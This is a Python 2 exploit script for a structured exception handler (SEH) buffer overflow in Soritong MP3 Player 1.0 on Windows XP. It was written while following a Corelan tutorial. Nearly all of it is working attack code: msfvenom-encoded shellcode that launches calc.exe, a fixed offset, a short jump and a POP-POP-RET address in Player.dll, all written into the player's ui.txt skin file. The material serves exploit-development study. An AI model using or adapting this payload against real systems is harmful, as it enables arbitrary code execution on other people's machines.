#!python
#
# Exploit Title   : py-sploit6-soritong-seh.py
# Exploit Author  : wetw0rk
# Version         : Soritong MP3 Player 1.0
# Tested on       : Windows XP SP3
# Description     : An example of SEH based exploits. Created following along with
#		    part 3 of corelans tutorials!
#
# Tutorial Link :
#    https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/
#
# Original Exploit:
#     https://www.exploit-db.com/exploits/8624/
#



import os, struct

# Change to Skins Directory
os.chdir("C:\Program Files\SoriTong\Skin\Default")

# msfvenom -a x86 --platform windows -p windows/exec CMD=calc.exe
# -f python -b "\c00" -e x86/alpha_mixed
buf =  ""
buf += "\xd9\xc0\xd9\x74\x24\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a"
buf += "\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x43\x37\x52"
buf += "\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
buf += "\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50"
buf += "\x38\x41\x42\x75\x4a\x49\x79\x6c\x79\x78\x4c\x42\x37"
buf += "\x70\x47\x70\x33\x30\x63\x50\x6e\x69\x48\x65\x75\x61"
buf += "\x59\x50\x61\x74\x4c\x4b\x50\x50\x50\x30\x4e\x6b\x56"
buf += "\x32\x36\x6c\x4c\x4b\x51\x42\x44\x54\x6c\x4b\x42\x52"
buf += "\x44\x68\x36\x6f\x4d\x67\x71\x5a\x65\x76\x46\x51\x6b"
buf += "\x4f\x6e\x4c\x45\x6c\x65\x31\x53\x4c\x55\x52\x74\x6c"
buf += "\x65\x70\x5a\x61\x58\x4f\x64\x4d\x35\x51\x4a\x67\x78"
buf += "\x62\x38\x72\x32\x72\x31\x47\x4c\x4b\x63\x62\x32\x30"
buf += "\x6e\x6b\x73\x7a\x35\x6c\x4c\x4b\x72\x6c\x52\x31\x42"
buf += "\x58\x4d\x33\x63\x78\x75\x51\x78\x51\x63\x61\x4c\x4b"
buf += "\x33\x69\x77\x50\x36\x61\x59\x43\x4c\x4b\x61\x59\x55"
buf += "\x48\x69\x73\x74\x7a\x32\x69\x4c\x4b\x36\x54\x4e\x6b"
buf += "\x45\x51\x68\x56\x66\x51\x59\x6f\x4c\x6c\x49\x51\x5a"
buf += "\x6f\x74\x4d\x45\x51\x6b\x77\x54\x78\x6b\x50\x73\x45"
buf += "\x58\x76\x46\x63\x73\x4d\x5a\x58\x77\x4b\x31\x6d\x56"
buf += "\x44\x44\x35\x59\x74\x36\x38\x6e\x6b\x71\x48\x64\x64"
buf += "\x73\x31\x49\x43\x32\x46\x6c\x4b\x36\x6c\x72\x6b\x6c"
buf += "\x4b\x42\x78\x35\x4c\x45\x51\x48\x53\x6e\x6b\x53\x34"
buf += "\x4c\x4b\x35\x51\x6a\x70\x4f\x79\x51\x54\x31\x34\x55"
buf += "\x74\x31\x4b\x73\x6b\x35\x31\x43\x69\x31\x4a\x72\x71"
buf += "\x6b\x4f\x6d\x30\x61\x4f\x31\x4f\x30\x5a\x6c\x4b\x42"
buf += "\x32\x6a\x4b\x6c\x4d\x51\x4d\x50\x6a\x76\x61\x6e\x6d"
buf += "\x4c\x45\x78\x32\x55\x50\x45\x50\x73\x30\x62\x70\x43"
buf += "\x58\x45\x61\x6e\x6b\x30\x6f\x4f\x77\x79\x6f\x69\x45"
buf += "\x6d\x6b\x48\x70\x48\x35\x4c\x62\x66\x36\x50\x68\x6d"
buf += "\x76\x4a\x35\x4f\x4d\x4d\x4d\x79\x6f\x48\x55\x37\x4c"
buf += "\x63\x36\x61\x6c\x34\x4a\x6d\x50\x79\x6b\x4d\x30\x74"
buf += "\x35\x73\x35\x6f\x4b\x51\x57\x77\x63\x44\x32\x42\x4f"
buf += "\x72\x4a\x75\x50\x52\x73\x59\x6f\x79\x45\x35\x33\x75"
buf += "\x31\x32\x4c\x32\x43\x56\x4e\x61\x75\x32\x58\x55\x35"
buf += "\x33\x30\x41\x41"

file = "ui.txt"

junk = "A"*584				# Offset before overwriting SEH
nextSEH = "\xeb\x06\x90\x90"		# Short JMP 6 bytes (2 NOPS to fill 4 bytes)
SEH = struct.pack('<L', 0x100104F8)	# POP, POP, RET (Player.dll)
junk2 = "\x90"*1000

print "[*] Overwriting C:\Program Files\SoriTong\Skin\Default\ui.txt"
evil = junk + nextSEH + SEH + buf + junk2
fd = open(file, 'w')
fd.write(evil)
fd.close
